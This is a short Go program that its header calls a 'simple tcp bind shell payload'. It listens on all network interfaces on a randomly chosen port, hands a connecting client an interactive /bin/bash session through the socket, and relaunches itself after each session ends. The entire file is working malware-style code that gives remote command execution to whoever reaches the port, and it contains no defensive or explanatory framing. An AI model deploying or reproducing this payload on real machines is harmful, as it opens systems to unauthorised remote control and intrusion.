//Michael Burke
//Simple tcp bind shell payload
package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"
)

var host string = "0.0.0.0"
var port string
var verbose bool = false

func main() {
	args := os.Args
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "-v" {
				verbose = true
			}
		}
	}
	port = "62" + getPort(0, "")
	do()
}

func reset() {
	port = "62" + getPort(0, "")
	do()
}

func do() {
	fmt.Println("Listening on port " + port)
	shell()
}

func getPort(i int, p string) string {
	i++
	if i > 3 {
		return p
	}
	p = p + strconv.Itoa(random(10))
	return getPort(i, p)
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func shell() {
	list, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		if verbose {
			fmt.Println(err.Error())
		}
		list.Close()
		reset()
		return
	}
	con, err := list.Accept()
	if err != nil {
		if verbose {
			fmt.Println(err.Error())
		}
		list.Close()
		con.Close()
		do()
		return
	}

	if verbose {
		fmt.Println("Connection established")
	}
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
	_, err = con.Write([]byte("Connection terminated. Restarting..."))
	list.Close()
	con.Close()
	do()
}
